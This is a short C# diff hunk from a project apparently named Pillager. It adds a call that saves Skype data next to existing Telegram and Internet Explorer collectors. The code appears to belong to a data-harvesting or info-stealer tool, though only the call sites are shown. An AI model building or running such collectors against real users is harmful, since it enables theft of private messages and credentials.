@@ -21,6 +21,8 @@ namespace Pillager
 
             Telegram.Save(savepath);
 
+            Skype.Save(savepath);
+
             //IE
             IE.Save(savepath);
 
